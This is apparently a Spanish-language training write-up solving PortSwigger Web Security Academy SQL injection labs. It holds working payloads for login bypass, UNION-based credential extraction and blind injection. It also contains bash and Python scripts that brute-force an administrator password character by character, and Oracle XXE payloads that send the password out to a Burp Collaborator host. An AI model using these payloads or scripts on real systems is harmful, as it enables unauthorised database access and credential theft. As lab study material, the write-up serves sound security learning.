#  SQL injection

- [SQL injection](#sql-injection)
  - [Retrieving hidden data](#retrieving-hidden-data)
    - [Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#lab1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
  - [Subverting application logic](#subverting-application-logic)
    - [Lab2: SQL injection vulnerability allowing login bypass](#lab2-sql-injection-vulnerability-allowing-login-bypass)
      - [1 forma](#1-forma)
      - [Otra forma sería:](#otra-forma-sería)
  - [Retrieving data from other database tables(Union attacks)](#retrieving-data-from-other-database-tablesunion-attacks)
    - [Lab3: SQL injection UNION attack, determining the number of columns returned by the query](#lab3-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
    - [Finding columns with a useful data type in an SQL injection UNION attack](#finding-columns-with-a-useful-data-type-in-an-sql-injection-union-attack)
      - [Lab4: SQL injection UNION attack, finding a column containing text](#lab4-sql-injection-union-attack-finding-a-column-containing-text)
    - [Using an SQL injection UNION attack to retrieve interesting data](#using-an-sql-injection-union-attack-to-retrieve-interesting-data)
      - [Lab5: SQL injection UNION attack, retrieving data from other tables](#lab5-sql-injection-union-attack-retrieving-data-from-other-tables)
    - [Retrieving multiple values within a single column](#retrieving-multiple-values-within-a-single-column)
      - [Lab6: SQL injection UNION attack, retrieving multiple values in a single column](#lab6-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
  - [Examining the database](#examining-the-database)
    - [Querying the database type and version](#querying-the-database-type-and-version)
      - [Lab7: SQL injection attack, querying the database type and version on Oracle](#lab7-sql-injection-attack-querying-the-database-type-and-version-on-oracle)
      - [Lab8: SQL injection attack, querying the database type and version on MySQL and Microsoft](#lab8-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
    - [Listing the contents of the database](#listing-the-contents-of-the-database)
      - [Lab9: SQL injection attack, listing the database contents on non-Oracle databases](#lab9-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
    - [Equivalent to information schema on Oracle](#equivalent-to-information-schema-on-oracle)
      - [Lab10: SQL injection attack, listing the database contents on Oracle](#lab10-sql-injection-attack-listing-the-database-contents-on-oracle)
  - [Blind SQL injection vulnerabilities](#blind-sql-injection-vulnerabilities)
    - [Lab11: Blind SQL injection with conditional responses](#lab11-blind-sql-injection-with-conditional-responses)
    - [Lab 12: Blind SQL injection with conditional errors](#lab-12-blind-sql-injection-with-conditional-errors)
  - [Exploiting blind SQL injection by triggering time delays](#exploiting-blind-sql-injection-by-triggering-time-delays)
    - [Lab13: Blind SQL injection with time delays](#lab13-blind-sql-injection-with-time-delays)
    - [Lab 14: Blind SQL injection with time delays and information retrieval](#lab-14-blind-sql-injection-with-time-delays-and-information-retrieval)
  - [Exploiting blind SQL injection using out-of-band (OAST) techniques](#exploiting-blind-sql-injection-using-out-of-band-oast-techniques)
    - [Lab 15: Blind SQL injection with out-of-band interaction](#lab-15-blind-sql-injection-with-out-of-band-interaction)
    - [Lab 16: Blind SQL injection with out-of-band data exfiltration](#lab-16-blind-sql-injection-with-out-of-band-data-exfiltration)
  
##  Retrieving hidden data

###  Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
  
  
```http
https://ac701fd11eeda548806db59400ab002f.web-security-academy.net/filter?category=Gifts' or 1 = 1 --
```
  
##  Subverting application logic
  
  
###  Lab2: SQL injection vulnerability allowing login bypass
  
  
![sql2.png](sql2.png )
  
####  1 forma
  
  
username: `administrator' --`
  
password: `cualquier cosa por que este será interpretado como comentario pero requiere de algun texto para poder ser validado`
  
####  Otra forma sería:
  
  
username: `administrator' or 1 = 1 --` 
  
password: `'or 1 = 1 --`
  
##  Retrieving data from other database tables(Union attacks)
  
  
###  Lab3: SQL injection UNION attack, determining the number of columns returned by the query
  
![sql3.png](sql3.png )
  
```http
https://ac961fdd1e31962380aa27ed00e300af.web-security-academy.net/filter?category=Accessories' union select null,null,null --
```
  
###  Finding columns with a useful data type in an SQL injection UNION attack
  
  
####  Lab4: SQL injection UNION attack, finding a column containing text
  
  
Lo primero es encontrar la cantidad de columnas que tiene la tabla
  
![sql4.1.png](sql4.1.png )
  
```http
https://accb1fe71f4b818780eb38b000d600be.web-security-academy.net/filter?category=Accessories' union select null,null,null --
```
  
ahora es identificar cual columna permite caracteres
  
```http
https://ac851f641e0191b48054265b00af0007.web-security-academy.net/filter?category=Accessories' union select null,'a',null --
```
  
Finalmente les mostramos el texto que nos piden "p20mtj"
  
![sql4.2.png](sql4.2.png )
  
```http
https://ac851f641e0191b48054265b00af0007.web-security-academy.net/filter?category=Accessories' union select null,'p2Omtj',null --
```
  
###  Using an SQL injection UNION attack to retrieve interesting data
  
  
####  Lab5: SQL injection UNION attack, retrieving data from other tables
  
  
Primero igual que los anteriores problemas buscamos la cantidad de columnas
  
```http
https://acf71f531efe798180e3028300c30029.web-security-academy.net/filter?category=Food+&+Drink' union select null,null --
```
  
luego buscamos cuales se pueden utilizar caracteres
  
```http
https://acf71f531efe798180e3028300c30029.web-security-academy.net/filter?category=' union select 'a','a' --
```
  
ahora si buscamos los usarios y las contraseñas
  
```http
https://acf71f531efe798180e3028300c30029.web-security-academy.net/filter?category=' union select username, password from users --
```
  
###  Retrieving multiple values within a single column
  
  
####  Lab6: SQL injection UNION attack, retrieving multiple values in a single column
  
  
Para este laboratorio solo podemos usar el segundo atributo pues el primero solo se permite el uso de enteros
  
```http
https://ac1c1f1b1f85900280d5c26a0063008a.web-security-academy.net/filter?category=Gifts' union select null,tables_name from information_schema.tables --
```
  
ahora buscamos de la tabla users sus columnas y para que no nos de valores extra de la anterior consulta hacemso que la consulta por defecto no nos bote resultados acortando a `category='union select ...`
  
```http
https://ac1c1f1b1f85900280d5c26a0063008a.web-security-academy.net/filter?category=' union select null,table_name||'<->'||column_name from information_schema.columns where table_name='users' --
```
  
Con esto ya tenemos las dos columnas `username` y `password`
  
```http
https://ac1c1f1b1f85900280d5c26a0063008a.web-security-academy.net/filter?category=' union select null,username||'<->'||password from users --
```
  
> administrator<->nqy8w4oj1tnda467u4lf
  
##  Examining the database
  
  
###  Querying the database type and version
  
  
####  Lab7: SQL injection attack, querying the database type and version on Oracle
  
  
De nuevo es averiguar el numero de columnas incialmente, pero en este caso el truco es intentar con el uso de una tabla dual que esta por defecto en la base de datos de oracle
  
```http
https://acc31f241f82d489800a5ce2002a001b.web-security-academy.net/filter?category=Accessories' union select null,null from dual --
```
  
ahora para sacar la version de un servidor de Oracle debemos adaptar la consulta `SELECT banner FROM v<img src="https://latex.codecogs.com/gif.latex?version`%20or%20`SELECT%20version%20FROM%20v"/>instance`
  
```http
https://acc31f241f82d489800a5ce2002a001b.web-security-academy.net/filter?category=Accessories' union select banner,null from v$version --
```
  
####  Lab8: SQL injection attack, querying the database type and version on MySQL and Microsoft
  
  
Ahora ya sabiendo como sacar las columnas podemos definir el resultado facilmente, en este caso la consulta a `SELECT @@version` sirve para base de datos de MySQL y Microsoft. En este caso `@@version` nos permite sacar la version y esta puede ser usada directamente como atributo en una consulta select por lo que no es necesario apuntar a una tabla como en el ejercicio anterior.
  
Nota: Para el uso de comentarios solo en MySQL es necesario que este sea acompañado de un espacio luego del uso de `--` y para que la pagina acepte la consulta en el url colocamos algo despues de ese espacio.
  
```http
https://ac0a1fa31ee8d2378087449100450099.web-security-academy.net/filter?category=Corporate+gifts' union select null,@@version -- algo
```
  
###  Listing the contents of the database
  
  
####  Lab9: SQL injection attack, listing the database contents on non-Oracle databases
  
  
Cantidad de columnas 
  
```http
https://ac331f5e1ed3d20e80bd47dc00a60093.web-security-academy.net/filter
?category=Gifts' union select 'null','null' --
```
  
no fue necesario agregar texto luego de los comentarios y tampoco fue necesario agreagar una columna dual por lo que descartamos MySQL y Oracle
  
Ahora tratemos de sacar la version de la base de datos
  
```http
https://ac331f5e1ed3d20e80bd47dc00a60093.web-security-academy.net/filter
?category=Gifts' union select 'a',version() --
```
  
tenemos entonces una DBMS que es PostgreSQL
  
`PostgreSQL 11.2 (Debian 11.2-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit`
  
Lo siguiente sería conocer en que base de datos estamos actualmente (opcional)
  
```http
https://ac331f5e1ed3d20e80bd47dc00a60093.web-security-academy.net/filter
?category=Gifts' union select 'a',current_database() --
```
  
Bueno estamos en la tabla postegres, lo siguiente sería buscar la tabla que nos intereza, la de usuarios
  
```http
https://ac331f5e1ed3d20e80bd47dc00a60093.web-security-academy.net/filter
?category=Gifts' union select TABLE_SCHEMA ,TABLE_NAME from information_schema.tables --
```
  
Varias tablas con nombres de users, será mejor encontrar alguna con una columna que tenga contraseña
  
```http
https://ac331f5e1ed3d20e80bd47dc00a60093.web-security-academy.net/filter
?category=Gifts' union select TABLE_NAME,COLUMN_NAME from information_schema.columns --
```
  
encontramos una tabla llamada `users_phrdzq` que contiene las columnas `username_fupjlk` y `password_dhtwtn`, entonces modificamos la consulta para obtener los valores de esta tabla
  
```http
https://ac331f5e1ed3d20e80bd47dc00a60093.web-security-academy.net/filter
?category=Gifts' union select username_fupjlk,password_dhtwtn from users_phrdzq --
```
  
obtenemos los valores de administrator
  
> | users_phrdzq  | password_dhtwtn      |
> | :------------ | -------------------- |
> | administrator | tcqd7xuw8lsd4uvn8e7z |
  
###  Equivalent to information schema on Oracle
  
  
####  Lab10: SQL injection attack, listing the database contents on Oracle
  
  
Realizamos los pasos similares al anterior, en este caso ya sabemos que es para un DBMS de oracle
  
para sacar la version
  
```http
https://acf91fd61fdb866c80560c7100da00ce.web-security-academy.net/filter
?category=Pets' union select null,banner from v$version --
```
  
para sacar las tablas de la base de datos
  
```http
https://acf91fd61fdb866c80560c7100da00ce.web-security-academy.net/filter
?category=Pets' union select null,TABLE_NAME from all_tables --
```
  
para sacar las columnas de la tabla USERS_ADMDFI que parece mas sospechoza
  
```http
https://acf91fd61fdb866c80560c7100da00ce.web-security-academy.net/filter
?category=Pets' union select TABLE_NAME,COLUMN_NAME from all_tab_columns where TABLE_NAME='' --
```
  
> | USERS_ADMDFI    | USERS_ADMDFI    |
> | :-------------- | --------------- |
> | USERNAME_SZEHOW | PASSWORD_TDJNHV |
  
ahora nos falta sacar los datos del administrador
  
```http
https://acf91fd61fdb866c80560c7100da00ce.web-security-academy.net/filter
?category=Pets' union select USERNAME_SZEHOW,PASSWORD_TDJNHV from USERS_ADMDFI --
```
  
> | USERNAME_SZEHOW | PASSWORD_TDJNHV      |
> | :-------------- | -------------------- |
> | administrator   | 8qib221yweviflt6sqyr |
  
##  Blind SQL injection vulnerabilities
  
  
###  Lab11: Blind SQL injection with conditional responses
  
  
nos damos cuenta de que debemos injectar la consulta en la cookie así que nos creamos un script en bash para sacar letra por letra la contraseña de `administrator`
  
```bash
abc=$(echo {9..0} {a..z})
url="https://acd11f891f9b5cd4807e1274007b0036.web-security-academy.net/"
cookie='session=MkTPsv6qpbxMxOToys1Qo8ZfRf1m7Zm9; TrackingId=b1cP94KSXHI3etwO'
truestring="Welcome back!"
psw=""
echo -n "try "
for ((i=1;i<=20;i+=1))
do
	for j in $abc
	do
		echo -n "$j"
		curl -i -s -k -b "$cookie' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), $i, 1)='$j" $url | grep -o "$truestring" &> /dev/null
		if [ "$?" -eq 0 ] ;then
			psw=$psw$j
			echo -e "\nfound $j | pasword: $psw"
			break
		fi
  
	done
done
echo $psw
echo "finish"
```
  
Despues de ejecutarlo solo nos quedaría logearnos para resolver el laboratorio.
  
###  Lab 12: Blind SQL injection with conditional errors
  
  
Utiliza una base de datos de oracle
  
Comprobamos que nos bote error colocando la cookie de la siguiente manera
  
```sql
42bE1LpD9wjQKpT9' and (SELECT case when (1=0) then to_char(1/0) else 'a' end from dual where rownum = 1)='a
```
  
Ahora probamos si tiene la tabla users como nos pide el ejercicio
  
```sql
42bE1LpD9wjQKpT9' and (SELECT case when (1=0) then to_char(1/0) else 'a' end from users where rownum = 1)='a
```
  
Luego verificamos la longitud de la contraseña del administrador
  
```sql
42bE1LpD9wjQKpT9' and (SELECT case when (length(password)=20) then to_char(1/0) else 'a' end from users where username='administrator')='a
```
  
lo demás será iterar hasta encontrar el resultado correcto en cada letra de `password`
  
```sql
42bE1LpD9wjQKpT9' and (SELECT case when (substr(password,1,1)='e') then to_char(1/0) else 'a' end from users where username='administrator')='a
```
  
l3w4nombeg0v2nrs90mv
  
##  Exploiting blind SQL injection by triggering time delays
  
  
###  Lab13: Blind SQL injection with time delays
  
  
Cambiar la cookie a:
  
```sql
QN8d4azscNQM5K9F'|| pg_sleep(10) --
```
  
###  Lab 14: Blind SQL injection with time delays and information retrieval
  
  
```python
from pwn import log
import requests
abc = 'abcdefghijklmnopqrstuvwxyz0123456789'
url = "https://acbc1f811f8fd8af802b7a9800bc00d8.web-security-academy.net/"
  
s = requests.Session()
password = ""
p1 = log.progress("Password")
p2 = log.progress("Trying")
for p in range(20):
    for a in abc:
        r = s.get(url, cookies={"TrackingId":"TIM9NdKmwTUJUYxT'%3B SELECT CASE WHEN ('"+a+"'=SUBSTRING(password,"+str(p+1)+",1)) THEN pg_sleep(3) ELSE pg_sleep(0) END from users where username='administrator'--", "session":"0iw1Ot3SXZodtYvilWtYeuySiejt9iW6"})
        p2.status("pos: "+ str(p+1)+ " letter: " + str(a)+" time: "+str(r.elapsed.total_seconds()))
        if r.elapsed.total_seconds() > 3 :
            password += a
            break
    p1.status(password)    
p1.success(password)
```
  
##  Exploiting blind SQL injection using out-of-band (OAST) techniques
  
  
###  Lab 15: Blind SQL injection with out-of-band interaction
  
  
Interceptamos la consulta a la página con burp suite
  
![sql15](sql15.png )
  
Le damos click derecho y lo enviamos al repeter, luego abrimos el burp collaborator para sacar el dominio, entonces al repeter modificamos la cookie TrackingId con lo siguiente:
  
```http
UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
  
Nota: En este caso funciono el usar una injeccion para postgresql, usando lo que indica la `cheet sheet` de burp suite.
  
Usamos el dominio que nos indique el burp collaborator y debemos codificar lo de arriba usando `ctrl+u` para que estos carateres no sean interpretados como otra cosa dentro de la cookie
  
```http	
' UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//5ci7n5ef8xrdtrputj0sw0emmds3gs.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```
  
se vería de la siguiente manera
  
![sql15.1.png](sql15.1.png )
  
verificamos que tenemos respuesta de burp collaborator
  
![sql15.2.png](sql15.2.png )
  
###  Lab 16: Blind SQL injection with out-of-band data exfiltration
  
  
Usamos lo mismo que el anterior laboratorio, pero en este caso tenemos una maquina con el sistema gestos de oracle así que use la siguiente injeccion.
  
```sql
'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username%3d'administrator')||'.1sugypi7x0xpk09lluylmpcqmhs7gw.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual --
```
  
  
